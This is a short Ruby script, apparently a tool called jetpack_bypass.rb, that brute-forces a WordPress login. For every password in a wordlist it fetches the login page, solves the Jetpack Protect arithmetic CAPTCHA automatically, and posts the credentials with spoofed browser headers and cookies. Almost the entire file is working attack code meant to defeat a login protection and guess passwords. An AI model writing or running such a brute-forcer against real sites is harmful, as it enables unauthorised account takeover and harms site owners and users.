require 'faraday'
require 'nokogiri'

# Grabs what we need for the CAPTCHA
def solve_captcha(response)
	# Grabs the jetpack key
	$jetpack_key = response.at_css('[name="jetpack_protect_answer"]')['value']
	# Completes the sum
	numbers = response.at_css('[style="margin: 5px 0 20px;"]').text.scan(/\d/).map(&:to_i)
	$solution = numbers[0] + numbers[1]
end

# Does some brute force stuff
if ARGV.length == 3
	# Grabs CLI arguments
	url = ARGV[0]
	username = ARGV[1]
	passwords = File.open(ARGV[2].to_s)
	con = Faraday.new
	# Iterates over each password in the list
	passwords.each do |password|
		puts "Testing #{username}:#{password.chomp}."
		# Grabs the login page
		res = con.get url
		html = Nokogiri::HTML res.body
		# CAPTCHA solving time
		solve_captcha(html)
		# Takes the values extracted from the login page and POSTs them to the app
		res = con.post do |req|
			req.url url
			req.headers['User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
			# These are particularly important. WP will throw you an error about your browser not accepting cookies if these aren't here
			req.headers['Cookie'] = 'catAccCookies=1; wordpress_test_cookie=WP+Cookie+check'
			# Initiates the request
			req.body = "log=#{username}&pwd=#{password.chomp}&jetpack_protect_num=#{$solution}&jetpack_protect_answer=#{$jetpack_key}&wp-submit=Log+In&redirect_to=#{url}/wp-admin/&testcookie=1"
		end
		# Checks the response for a login error and prints the appropriate response
		if res.body.include? "login_error" or res.status != 200
			puts "FAIL" + "(" + res.status.to_s + ")"
		else
			puts "SUCCESS"
		end
	end
else
	# Usage info
	puts "USAGE: ruby jetpack_bypass.rb URL USERNAME /PATH/TO/WORDLIST.txt"
end